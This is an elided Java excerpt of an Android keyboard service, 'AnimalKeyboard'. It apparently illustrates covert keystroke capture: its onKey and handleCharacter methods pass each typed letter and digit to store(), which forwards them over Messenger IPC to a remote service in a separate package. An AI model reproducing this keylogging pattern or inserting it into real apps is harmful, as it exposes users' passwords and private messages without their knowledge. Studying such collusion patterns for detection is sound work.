 ...
 */
public class AnimalKeyboard extends InputMethodService 
    ...
    private LatinKeyboard mEmoticonsKeyboard;
    ...
    @Override public void onInitializeInterface() {
        ...
        mEmoticonsKeyboard = new LatinKeyboard(this, R.xml.emoticons);
    }
    ...
    @Override public void onStartInput(EditorInfo attribute, boolean restarting) {
        ...
        //Bind to the remote service
      	...
      	intent.setClassName("com.animal.ipc1", "com.animal.ipc1.RemoteService");
	...
	{
		if(AnimalKeyboard.this.isBound)
		{
			//Setup the message for invocation
			Message message = Message.obtain(null, 1, 0, 0);
			Bundle bundle = new Bundle();
			bundle.putString("k", msg);
			message.setData(bundle);
			
			try
			{
				//Make the invocation
				AnimalKeyboard.this.messenger.send(message);
			}
        ...
        switch (keyCode) {
            ...
            default:
                if (keyCode >= '0' && keyCode <= '9') {
                    ...
                    store(String.valueOf((char) keyCode));
                }
                break;
        }
    }
    ...
    private void handleCharacter(int primaryCode, int[] keyCodes) {
        ...
        if (isAlphabet(primaryCode) && mPredictionOn) {
            ...
            store(String.valueOf((char) primaryCode));
        }
    }
    ...
    private class RemoteServiceConnection implements ServiceConnection
	{
		...
		{       
			AnimalKeyboard.this.messenger = new Messenger(binder);

			AnimalKeyboard.this.isBound = true;
		}

		@Override
		public void onServiceDisconnected(ComponentName component) 
		{       
			AnimalKeyboard.this.messenger = null;

			AnimalKeyboard.this.isBound = false;
		}
	}
}
